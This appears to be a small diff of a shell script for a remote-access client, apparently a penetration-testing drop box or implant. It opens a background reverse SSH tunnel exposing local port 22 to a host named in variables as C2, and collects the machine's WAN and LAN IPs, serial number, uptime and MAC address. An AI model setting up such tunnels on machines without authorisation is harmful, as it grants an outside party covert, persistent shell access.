@@ -9,7 +9,7 @@
 ############################################################################### 
 
 source /opt/einar/client/config.sh
-$LOG "testbob"
+
 # Setup our SSH Tunnel
 sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f -n
 if [ $? == 1 ]; then 
@@ -24,9 +24,10 @@ if [ $? == 1 ]; then
 
 
 		WAN_IP=$(curl ifconfig.me)
-		LANIP=$(ip a| grep inet| grep -v inet6| grep -v 127.0.0.1)
+		LAN_IP=$($IFCONFIG eno1 | grep "inet " | awk '{print $2}' )
 		SERIAL=$(dmidecode -s system-serial-number)
 		UPTIME=$(uptime)
+		MAC=$(/sbin/ifconfig eno1 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
 
 		echo "LAN IP = $LAN_IP " > $LOKIHOME/netinfo
 		echo "WAN IP = $WAN_IP" >> $LOKIHOME/netinfo
